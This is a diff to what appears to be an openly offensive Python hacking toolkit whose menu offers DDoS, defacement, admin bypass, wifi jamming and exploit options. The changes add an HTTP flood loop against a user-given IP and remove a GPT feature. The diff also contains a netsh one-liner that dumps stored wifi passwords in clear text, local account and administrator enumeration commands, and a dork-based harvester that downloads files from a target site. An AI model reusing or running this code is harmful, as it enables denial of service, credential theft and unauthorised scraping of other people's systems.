@@ -16,10 +16,14 @@ except ModuleNotFoundError as e:
 import time
 import os
 from os.path import exists
-import googlesearch
-import wget
-import urllib.request
+import googlesearch #googlesearch-python
+import wget #wget
+import urllib.request #urllib
 import colorama
+from threading import Thread, Lock #threading2
+from subprocess import Popen, PIPE
+from signal import SIGINT, signal
+import scapy #scapy
 from colorama import Fore, Style, init
 import random
 import socket
@@ -37,7 +41,6 @@ import phonenumbers
 from phonenumbers import timezone, geocoder, carrier
 from pythonping import ping
 import exiftool
-import openai
 import importlib
 
 global user_ip
@@ -165,7 +168,7 @@ print(f"""{yellow}┌───────────────────�
 {yellow}│{blue} [02] DDOS                                             [12] Executor {red}[Hot Results]{blue}               {yellow}│{blue}
 {yellow}│{blue} [03] Admin Finder                                     [13] Ping Site                            {yellow}│{blue}
 {yellow}│{blue} [04] Dork                                             [14] Deface {red}[Hot Results]{blue}                 {yellow}│{blue}
-{yellow}│{blue} [05] Database Finder {red}[Hot Results]{blue}                    [15] GPT [Not Working Now]                {yellow}│{blue}
+{yellow}│{blue} [05] Database Finder {red}[Hot Results]{blue}                    [15] GPT [DELETED !!]                     {yellow}│{blue}
 {yellow}│{blue} [06] Admin Bypasser V1 {green}[Fixed]{blue}                        [16] Mass Deface {red}[Hot Results]{blue}            {yellow}│{blue}
 {yellow}│{blue} [07] Phone Number Info                                [17] Wifi Jammer {red}[Hot Results]{blue}            {yellow}│{blue}
 {yellow}│{blue} [08] DOFOX {red}[Hot Results]{blue}                              [18] Auto XPLOIT {red}[Okay Results]{blue}           {yellow}│{blue}
@@ -1436,24 +1439,7 @@ elif answer == ("14"):
         print(fail + f'File {files2} Not Found On Your Internal')
 elif answer == ("15"):
     pass
-    print("The AI Didn't Work ..")
-    # Gantilah dengan kunci API Anda dari OpenAI
-    api_key = input(f'Api Key : ')
-
-    # Fungsi untuk mendapatkan respons dari model GPT-3
-    
-    pertanyaan = input("Question : ")
-    
-    def ai_respons(pertanyaan):
-        openai.api_key = api_key
-        response = openai.Completion.create(
-            engine="babbage",  # Gantilah dengan engine yang sesuai
-            prompt=pertanyaan,
-            max_tokens=900  # Sesuaikan dengan panjang respons yang diinginkan
-        )
-        return response.choices[0].text
-    respons = ai_respons(pertanyaan)
-    print("AI:", respons)
+    print("The AI Didn't Work, So This Feature Has Been Deleted By The Owner..")
 elif answer == ("16"):
     try:
         print("""\033[1;33m
@@ -1536,9 +1522,10 @@ elif answer == ("17"):
         print("3. Crack All Wifi Password [Windows Terminal ONLY !]")
         print("4. INFRA RED SENDER, +25 Frequency 5/sec")
         print("5. A Little Annoying")
-        e = input("Do you wan't to jammer your wifi, or other wifi? : ")
+        print("6. IDK")
+        e = input("Select : ")
     
-        if e.startswith("1"):
+        if e == "1":
             print("\033[1;34mSelect Method : ")
             print("1. RAP")
             print("2. RPC")
@@ -1788,7 +1775,7 @@ elif answer == ("17"):
                                             print(info + f'{dozher}')    
                     except KeyboardInterrupt:
                         exit()                        
-        elif e.startswith("2"):
+        elif e =="2":
                 pass
                 print('\033[1;91m_' *22)
                 print('\033[1;33m1. IP Monitoring')
@@ -1909,10 +1896,10 @@ elif answer == ("17"):
                         time.sleep(0.5)
                         print('')
                         os.system(f'q {sel} {y}')       
-        if e.startswith("3"):
+        if e == "3":
             time.sleep(0.5)
             os.system("""for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @if "%j" NEQ "" (echo SSID: %j & netsh wlan show profiles %j key=clear | findstr "Key Content")""")
-        elif e.startswith("4"):
+        elif e == "4":
             try:
                 frq = 125
                 frq = frq + 25
@@ -1922,22 +1909,47 @@ elif answer == ("17"):
                         print(info + f"Sending {frq} Frequency..")
                         ir.send(frq, True)
                         print(info + f"Cooldown 5 sec..")
-                        sleep(5)
+                        time.sleep(5)
 
                 if __name__ == "__main__":
                     main()
             except ModuleNotFoundError or ImportError or NameError is True:
                 print("Did you have raspberry pi 4 ?")
-        elif e.startswith("5"):
+        elif e == "5":
             pass
-        if os.name == 'posix':  # Untuk sistem seperti Linux atau macOS
-            os.system('ip -f link -o -a -c a')
-            os.system('ip -f inet -o -a -c a')
-            os.system('ip -f inet6 -o -a -c a')
-        elif os.name == 'nt':   # Untuk sistem Windows
-            os.system('net share')
-            os.system('net user')
-            os.system('net localgroup Administrators')
+            if os.name == 'posix':  # Untuk sistem seperti Linux atau macOS
+                os.system('ip -f link -o -a -c a')
+                os.system('ip -f inet -o -a -c a')
+                os.system('ip -f inet6 -o -a -c a')
+            elif os.name == 'nt':   # Untuk sistem Windows
+                os.system('net share')
+                os.system('net user')
+                os.system('net localgroup Administrators')
+        elif e == "6":
+            try:
+                target = input(f"IP : ")
+                port = 80
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                i = int(1)
+                byte = int(21)
+                while True:
+                    
+                    i += 8
+                    byte += 50
+                    print(f"[ + ] Sending {i} Signal To {target}, {byte}")
+                    for e in range(i):
+                        e = f"http://{target}"
+                        res = requests.get(e)
+                        if res.status_code == 200:
+                            response = requests.post(e)
+                    col = green, blue, yellow, white
+                    rand = random.choice(col)
+                    if res.status_code == 200:
+                        print(rand + f"[ + ] : {target} {i} {byte} [ + ]")
+                    elif res.status_code == 403 or 404 or TimeoutError:
+                        print(fail + f"[!] Web Server : {target} Is Down Or Forbidden.. {i} [!]")
+            except ModuleNotFoundError and KeyboardInterrupt:
+                exit()
 elif answer == ("18"):
     pass
     print(f"""{red}
@@ -2586,7 +2598,6 @@ elif answer == ("20"):
                         payload = {
                             idu : nick,
                             idp : password
-                            
                         }
 
                         # Melakukan permintaan POST untuk login
@@ -2641,88 +2652,99 @@ elif answer == ("20"):
         {green} ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝     ╚═════╝ ╚═════╝ 
                                                                             
         """)
-        files = input(f"File Extension [example : pdf xls csv] : ")
-        site = input(f"Target Site : ")
-        mode = input(f"Save As TXT / Auto Download ? txt/download : ")
+        try:
+            files = input(f"File Extension [example : pdf xls csv] : ")
+            site = input(f"Target Site : ")
+            mode = input(f"Save As TXT / Auto Download ? txt/download : ")
+        except FileExistsError:
+            print(fail + f"File {site} Is Exists.. Do You Want To Delete It?")
+            o = input("Y/N : ")
+            if o == "Y" or "y":
+                os.removedirs(site)
+            else:
+                exit()
         if mode == "download":
-            file_list = files.split()
-            result = file_list
-            print('')
-            print('[!] Please Wait [!]')  
-            print(f"[ + ] All Results Will Be Downloaded On Folder {site} [ + ]")
-            time.sleep(0.6)
-            for i in result:
-                try:
-                    os.mkdir(site)
-                    print(info + f"[ + ]Searching Info For [ + ] : {i}")
-                    num = 1
-                    num = num + 1
-                    rand_user = random.choice(user_agents)
-                    for results in search(f'filetype:{i} site:{site}', num=int(num), pause=2, stop=0, start=0):
-                        print('')
-                        print(success + results)
-                        wget.download(results, out=site)
-                    else:
-                        print(white + f"[!] Couldn't Find For {i} Site : {site}")
-                except FileExistsError:
-                    print(fail + f"[!] File {site} Already Exists [!]")
-                    delete = input(f"Delete? y/n : ")
-                    if delete == "Y" or "y":
-                        os.removedirs(site)
-                    else:
-                        exit()
-                except urllib.error.HTTPError as e:
-                    if e.code == 429:
-                        print(fail + f"[!] 429 Error !!, Coldown For 25 Sec.. [!]")
-                        time.sleep(25)
-                    if e.code == 403:
-                        print(fail + f"[!] 403, File Forbidden To Download.. [!]")
-                        continue
-                    if e.code == 404:
-                        print(fail + f"[!] File Didn't Exists.. [!]")
-                        continue
-                    if e.code == 1006:
-                        print(fail + f"[!] Error While Running Task.. [!]")
-                        exit()
+            try:
+                file_list = files.split()
+                result = file_list
+                print('')
+                print('[!] Please Wait [!]')  
+                print(f"[ + ] All Results Will Be Downloaded On Folder {site} [ + ]")
+                os.mkdir(site)
+                time.sleep(0.6)
+                for i in result:
+                    try:
+                        print(info + f"[ + ]Searching Info For [ + ] : {i}")
+                        num = 1
+                        num = num + 1
+                        rand_user = random.choice(user_agents)
+                        for results in search(f'filetype:{i} site:{site}', tld='com', lang='en', num=int(num), pause=2, stop=0, start=0):
+                            print('')
+                            print(success + results)
+                            wget.download(results, out=site)
+                        else:
+                            print(white + f"[!] Couldn't Find For {i} Site : {site}")
+                    except urllib.error.HTTPError as e:
+                        if e.code == 429:
+                            print(fail + f"[!] 429 Error !!, Coldown For 25 Sec.. [!]")
+                            time.sleep(25)
+                        if e.code == 403:
+                            print(fail + f"[!] 403, File Forbidden To Download.. [!]")
+                            continue
+                        if e.code == 404:
+                            print(fail + f"[!] File Didn't Exists.. [!]")
+                            continue
+                        if e.code == 1006:
+                            print(fail + f"[!] Error While Running Task.. [!]")
+                            exit()
+            except FileExistsError:
+                 print(fail + f"[!] File {site} Already Exists [!]")
+                 delete = input(f"Delete? y/n : ")
+                 if delete == "Y" or "y":
+                     os.removedirs(site)
+                     pass
+                 else:
+                     exit()
         elif mode == "txt":
-            file_list = files.split()
-            result = file_list
-            print('')
-            print('[!] Please Wait [!]')
-            time.sleep(0.6)
-            for i in result:
-                try:
-                    print(info + f"[ + ] Searching Results For {i}.. [ + ]")
-                    rand_user = random.choice(user_agents)
-                    req = 1
-                    req = req + 1
-                    for results in search(f'filetype:{i} site:{site}', num=int(req), pause=2, stop=None, start=0):
-                        print('')
-                        print(success + results)
-                        def log(site):
-                            file = open((site) + ".txt", "a")
-                            file.write(str(results))
-                            file.write("\n")
-                            file.close
-                            file_name = site
-                        log(site)
-                    else:
-                        print(fail + f"[!] File {i} Doesn't Exists [!]")
-                except FileExistsError:
-                    print(fail + f"[!] File {site}.txt Already Exists [!]")
-                    delete = input(f"Delete? y/n : ")
-                    if delete == "Y" or "y":
-                        os.removedirs(site)
-                    else:
+            try:
+                file_list = files.split()
+                result = file_list
+                print('')
+                print('[!] Please Wait [!]')
+                time.sleep(0.6)
+                for i in result:
+                    try:
+                        print(info + f"[ + ] Searching Results For {i}.. [ + ]")
+                        rand_user = random.choice(user_agents)
+                        req = 1
+                        req = req + 1
+                        for results in search(f'filetype:{i} site:{site}', num=int(req), pause=2, stop=None, start=0):
+                            print('')
+                            print(success + results)
+                            def log(site):
+                                file = open((site) + ".txt", "a")
+                                file.write(str(results))
+                                file.write("\n")
+                                file.close
+                                file_name = site
+                            log(site)
+                        else:
+                            print(fail + f"[!] File {i} Doesn't Exists [!]")
+                    except urllib.error.HTTPError as e:
+                        if e.code == 429:
+                            print(fail + f"[!] Error 429.. Coldown 25 sec.. [!]")
+                            time.sleep(25)
+                    except KeyboardInterrupt:
+                        print("Interrupt")
                         exit()
-                except urllib.error.HTTPError as e:
-                    if e.code == 429:
-                        print(fail + f"[!] Error 429.. Coldown 25 sec.. [!]")
-                        time.sleep(25)
-                except KeyboardInterrupt:
-                    print("Interrupt")
+                print(success + f"[ + ] Done.. [ + ]")
+            except FileExistsError:
+                print(fail + f"[!] File {site}.txt Already Exists [!]")
+                delete = input(f"Delete? y/n : ")
+                if delete == "Y" or "y":
+                    os.removedirs(site)
+                else:
                     exit()
-            print(success + f"[ + ] Done.. [ + ]")
-if KeyboardInterrupt is True:
-    print("Interrupt")
+else:
+    print(green + f"Exit")
     exit()
